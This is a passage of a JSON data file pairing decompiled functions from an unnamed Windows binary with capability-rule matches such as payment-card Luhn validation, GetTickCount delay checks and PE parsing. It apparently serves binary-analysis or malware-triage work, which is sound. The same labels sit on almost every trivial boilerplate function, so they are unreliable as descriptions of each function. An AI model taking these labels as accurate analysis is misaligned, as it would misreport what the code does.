            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065e0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.004065e0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.004068a0(in_ECX + 0x14);\n    *arg_8h = uVar1;\n    uStack8 = 0x406626;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 189
    },
    "00406630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406630(uint *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_2ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406630::var_2ch;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    uVar3 = fcn.004068d0(in_ECX + 0x14);\n    *arg_8h = uVar3;\n    arg_8h[1] = uVar3 >> 0x20;\n    uStack8 = 0x4066a9;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 240
    },
    "004066b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066b0(uint *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004066b0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    uVar3 = fcn.004068d0(in_ECX + 0x14);\n    *arg_8h = uVar3;\n    arg_8h[1] = uVar3 >> 0x20;\n    uStack8 = 0x4066f9;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 209
    },
    "00406700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406700(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406700::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.00406870(in_ECX + 0x14);\n    *arg_8h = uVar1;\n    uStack8 = 0x406747;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 187
    },
    "00406800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406800(char *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040dc80(*arg_8h, *arg_ch);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 131
    },
    "00406840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406840(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h + 4;\n    return arg_8h & 0xffffff00 | *(*arg_8h + -4);\n}\n",
        "token_count": 60
    },
    "00406870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406870(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h + 4;\n    return arg_8h & 0xffff0000 | *(*arg_8h + -4);\n}\n",
        "token_count": 61
    },
    "004068a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004068a0(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h + 4;\n    return *(*arg_8h + -4);\n}\n",
        "token_count": 49
    },
    "004068d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004068d0(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h + 8;\n    return *(*arg_8h + -8);\n}\n",
        "token_count": 49
    },
    "00406900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00406900(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406900::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00406150();\n    uStack8 = 0x406938;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 142
    },
    "00406940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406940(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406940::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.004053f0();\n    if (cVar1 == '\\0') {\n        fcn.00406150();\n    }\n    else {\n        fcn.00405460();\n        fcn.00406150();\n    }\n    uStack8 = 0x4069ac;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 196
    },
    "004069b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004069b0(uint *str, uint *endptr, uint *base)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_strtol(*str, *endptr, *base);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 133
    },
    "00406d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406d10(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406d10::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    var_8h = param_1;\n    fcn.00406fb0();\n    var_8h[4] = 0;\n    var_8h[5] = 0;\n    var_8h[6] = 0;\n    var_8h[7] = 0;\n    var_8h[8] = 0;\n    var_8h[9] = 0;\n    var_8h[10] = 0;\n    *(var_8h + 0xc) = 0;\n    *(var_8h + 0x31) = 0;\n    var_8h[0xe] = 0;\n    *(var_8h + 0xf) = 0;\n    fcn.00407020();\n    uStack8 = 0x406dd4;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 345
    },
    "00406de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406de0(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint *var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x412770;\n    var_ch = *in_FS_OFFSET;\n    puVar3 = &fcn.00406de0::var_18h;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00406de0::var_ch;\n    fcn.00406d10(uVar1);\n    var_14h[0x112] = *arg_8h;\n    *var_14h = arg_ch;\n    var_14h[1] = arg_10h;\n    var_14h[2] = arg_18h;\n    var_14h[4] = arg_14h;\n    var_14h[5] = arg_1ch;\n    *in_FS_OFFSET = var_ch;\n    uStack8 = 0x406e7c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 376
    },
    "00406e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406e90(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405d60(arg_8h, &arg_ch, &arg_14h, &arg_18h, &arg_1ch);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 181
    },
    "00406ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406ef0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    uint var_8h;\n    \n    puVar2 = &fcn.00406ef0::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405380(arg_8h);\n    var_8h = 0x406f3b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 162
    },
    "00406f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406f50(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406f50::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    *in_ECX = arg_8h;\n    var_8h = in_ECX;\n    uVar1 = fcn.0040de50(arg_8h);\n    *(var_8h + 1) = uVar1;\n    uStack8 = 0x406f9d;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 211
    },
    "00407020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407020(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    \n    puVar2 = &fcn.00407020::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 0x400) = 0;\n    var_8h = param_1;\n    fcn.00405380(0);\n    var_8h = 0x40707b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 185
    },
    "00407080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00407080(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407080::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407dc0();\n    uStack8 = 0x4070b8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 145
    },
    "004070c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004070c0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004070c0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407250();\n    uStack8 = 0x4070fb;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 145
    },
    "00407100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00407100(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407100::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004070c0();\n    uStack8 = 0x407138;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 143
    },
    "00407140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00407140(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407140::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407180();\n    uStack8 = 0x407178;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 142
    },
    "00407180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00407180(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407180::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407100();\n    uStack8 = 0x4071b8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 144
    },
    "004071c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004071c0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004071c0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.0040df90(*(param_1 + 1), *param_1);\n    uStack8 = 0x407206;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 174
    },
    "00407250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00407250(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407250::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407080();\n    uStack8 = 0x40728e;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 143
    },
    "004072a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004072a0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004072a0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407dc0();\n    *var_8h = *arg_8h;\n    *arg_8h = 0;\n    uStack8 = 0x4072ee;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 177
    },
    "00407300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407300(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407300::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.00405ce0(*param_1);\n    uStack8 = 0x40733e;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 165
    },
    "00407350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407350(uint *param_1)\n\n{\n    uint arg_18h;\n    uint arg_ch;\n    uint noname_2;\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_EDX;\n    uint *puVar3;\n    uint arg_14h;\n    uint var_6f0h;\n    uint var_6ech;\n    uint var_6e8h;\n    uint var_6e4h;\n    uint var_6e0h;\n    uint var_6dch;\n    uint var_6d4h;\n    uint var_6c8h;\n    uint var_4b0h;\n    uint var_47ch;\n    uint uStack40;\n    uint var_1ch;\n    uint *var_ch;\n    uint32_t var_4h;\n    \n    puVar3 = &fcn.00407350::var_4b0h;\n    for (iVar2 = 300; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    var_ch = param_1;\n    fcn.00406f50(**param_1);\n    uVar1 = *var_ch[4];\n    arg_18h = *var_ch[3];\n    arg_14h = *var_ch[2];\n    arg_ch = *var_ch[1];\n    noname_2 = var_ch[1][1];\n    arg_8h = fcn.00406ef0(**var_ch);\n    fcn.00406e90(arg_8h, arg_ch, noname_2, arg_14h, arg_18h, uVar1);\n    uVar1 = fcn.00407ad0();\n    fcn.00407140();\n    fcn.004071c0();\n    fcn.00411450(uVar1, extraout_EDX);\n    fcn.00405180(arg_14h);\n    uStack40 = 0x407471;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 493
    },
    "004074b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004074b0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004074b0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.00405c60(*param_1);\n    uStack8 = 0x4074ee;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 167
    },
    "00407500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407500(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_d9h;\n    uint var_14h;\n    uint var_8h;\n    \n    if (arg_ch == '\\0') {\n        var_d9h._0_1_ = 'a';\n    }\n    else {\n        var_d9h._0_1_ = 'A';\n    }\n    return var_d9h + -0x3a + arg_8h;\n}\n",
        "token_count": 121
    },
    "00407700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00407700(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t var_100h;\n    uint var_40h;\n    int32_t var_38h;\n    uint32_t var_2ch;\n    int32_t var_20h;\n    int32_t *var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00407700::var_40h;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_20h = fcn.00408c40();\n    var_14h = &fcn.00407700::var_20h;\n    if ((arg_8h < ' ') || ('z' < arg_8h)) {\n        var_100h = 0;\n    }\n    else {\n        var_100h = *(var_20h + -0x20 + arg_8h) & 0xf;\n    }\n    var_2ch = var_100h;\n    iVar1 = fcn.00408c20();\n    var_38h = iVar1 * var_2ch + arg_ch;\n    fcn.00411450(*(*var_14h + var_38h) >> 4, var_38h);\n    uStack8 = 0x4077ab;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 378
    },
    "00407990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407990(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_129h;\n    uint var_11dh;\n    uint var_111h;\n    int32_t var_108h;\n    uint *var_fch;\n    uint var_f0h;\n    uint var_70h;\n    uint32_t var_24h;\n    uint var_18h;\n    int32_t var_8h;\n    \n    puVar5 = &fcn.00407990::var_70h;\n    for (iVar4 = 0x1c; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0xcccccccc;\n        puVar5 = puVar5 + 1;\n    }\n    uVar1 = fcn.004078e0();\n    fcn.00406fe0(uVar1);\n    var_24h = 0;\n    var_f0h = 10;\n    var_fch = &fcn.00407990::var_24h;\n    var_108h = *(var_8h + 0x10) + -1;\n    uVar1 = fcn.004069b0(&fcn.00407990::var_108h, &fcn.00407990::var_fch, &fcn.00407990::var_f0h);\n    *arg_8h = uVar1;\n    piVar2 = fcn.004078e0();\n    if (*piVar2 == 0x22) {\n        uVar6 = fcn.00407210();\n        uVar1 = uVar6 >> 0x20;\n        uVar3 = uVar6 & 0xffffff00;\n    }\n    else if (var_24h < *(var_8h + 0x10)) {\n        uVar6 = fcn.00407210();\n        uVar1 = uVar6 >> 0x20;\n        uVar3 = uVar6 & 0xffffff00;\n    }\n    else {\n        *(var_8h + 0x10) = var_24h;\n        uVar6 = fcn.00407210();\n        uVar1 = uVar6 >> 0x20;\n        uVar3 = uVar6 & 0xffffff00 | 1;\n    }\n    fcn.00411450(uVar3, uVar1);\n    var_8h = 0x407a97;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 586
    },
    "00407dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407dc0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d1h;\n    uint var_18h;\n    uint *var_8h;\n    \n    puVar2 = &fcn.00407dc0::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.00405dd0(*param_1);\n    *var_8h = 0;\n    var_8h = 0x407e0a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 184
    },
    "00407eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407eb0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    \n    puVar2 = &fcn.00407eb0::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    // switch table (17 cases) at 0x407f5c\n    switch(*(param_1 + 0x31)) {\n    case 0x20:\n        fcn.00407e10(2);\n        break;\n    case 0x23:\n        fcn.00407e10(0x20);\n        break;\n    case 0x2b:\n        fcn.00407e10(1);\n        break;\n    case 0x2d:\n        fcn.00407e10(4);\n        break;\n    case 0x30:\n        fcn.00407e10(8);\n    }\n    var_8h = 0x407f55;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 300
    },
    "00408070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408070(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_d0h;\n    uint var_10h;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.00408070::var_10h;\n    for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.004080f0(0);\n    if (cVar1 != '\\0') {\n        fcn.00409fe0(*(var_8h + 0x31), var_8h + 0x18);\n    }\n    var_10h = 0x4080df;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 206
    },
    "00408c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408c60(int32_t param_1)\n\n{\n    uint var_8h;\n    \n    return param_1 + 0x34;\n}\n",
        "token_count": 41
    },
    "00408c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
